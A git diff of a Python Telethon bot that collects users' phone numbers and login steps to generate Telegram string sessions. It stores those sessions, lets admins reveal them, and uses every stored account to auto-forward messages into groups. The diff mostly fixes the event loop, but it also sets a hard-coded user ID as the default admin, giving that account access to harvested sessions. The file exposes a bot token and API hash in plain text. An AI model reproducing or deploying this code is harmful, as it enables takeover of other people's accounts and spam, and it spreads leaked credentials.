@@ -2,6 +2,7 @@ import asyncio
 import json
 import os
 import random
+import sys
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -9,9 +10,17 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
 )
+
 from telethon.tl.functions.messages import GetHistoryRequest
 
-# === 🔧 Configuration ===
+# === 🔧 Python 3.10+ Event Loop Fix ===
+if sys.version_info >= (3, 10):
+    try:
+        asyncio.get_running_loop()
+    except RuntimeError:
+        asyncio.set_event_loop(asyncio.new_event_loop())
+
+# === Configuration ===
 BOT_API_ID = 24565808
 BOT_API_HASH = "4eb74502af26e86c3571225a29243e3e"
 BOT_TOKEN = "7802435088:AAHcwYbO1nFpz4jZljkwy4Xm9Nr9GRfpV2Y"  # Replace with your bot token
@@ -31,10 +40,10 @@ def save_config(cfg):
         json.dump(cfg, f, indent=4)
 
 config = load_config()
-admins = config.get("admins", [])
+admins = config.get("admins", [5087266104])
 user_states = {}
 
-# === 🤖 Bot Setup ===
+# === Bot Setup ===
 bot = TelegramClient("bot_controller", BOT_API_ID, BOT_API_HASH).start(bot_token=BOT_TOKEN)
 
 # === /start Command ===
@@ -52,7 +61,6 @@ async def gen_session_handler(event):
     user_states[event.sender_id] = {"step": "awaiting_phone"}
     await event.respond("📞 Please enter your **phone number** (with country code).", buttons=Button.clear())
 
-# === Session Handler ===
 @bot.on(events.NewMessage())
 async def handle_session_flow(event):
     user_id = event.sender_id
@@ -128,7 +136,6 @@ async def finalize_session(user_id, event):
         buttons=[Button.inline("🔑 Reveal String", data=f"show_string:{session_name}")]
     )
 
-# === Reveal String Handler ===
 @bot.on(events.CallbackQuery(data=lambda d: d.decode().startswith("show_string:")))
 async def reveal_string(event):
     if event.sender_id not in admins:
@@ -147,7 +154,6 @@ async def reveal_string(event):
 
     await event.edit(f"🔐 **String Session:**\n\n`{session_string}`\n\n⚠️ Keep this private!")
 
-# === /addgroup Command ===
 @bot.on(events.NewMessage(pattern=r"^/addgroup"))
 async def add_group(event):
     if event.sender_id not in admins:
@@ -162,7 +168,6 @@ async def add_group(event):
     else:
         await event.reply("⚠️ Already added.")
 
-# === /removegroup Command ===
 @bot.on(events.NewMessage(pattern=r"^/removegroup"))
 async def remove_group(event):
     if event.sender_id not in admins:
@@ -177,7 +182,6 @@ async def remove_group(event):
     else:
         await event.reply("⚠️ Not found.")
 
-# === Auto Forwarder ===
 async def auto_forwarder(session_name):
     session_path = os.path.join(ACCOUNTS_DIR, f"{session_name}.session")
     client = TelegramClient(session_path, BOT_API_ID, BOT_API_HASH)
@@ -204,12 +208,11 @@ async def auto_forwarder(session_name):
             print(f"[{session_name}] Error: {e}")
             await asyncio.sleep(120)
 
-# === Start Everything ===
 async def start_all():
     await bot.start()
     tasks = [asyncio.create_task(auto_forwarder(session)) for session in config["accounts"]]
     await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
-    asyncio.run(start_all())
-
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(start_all())
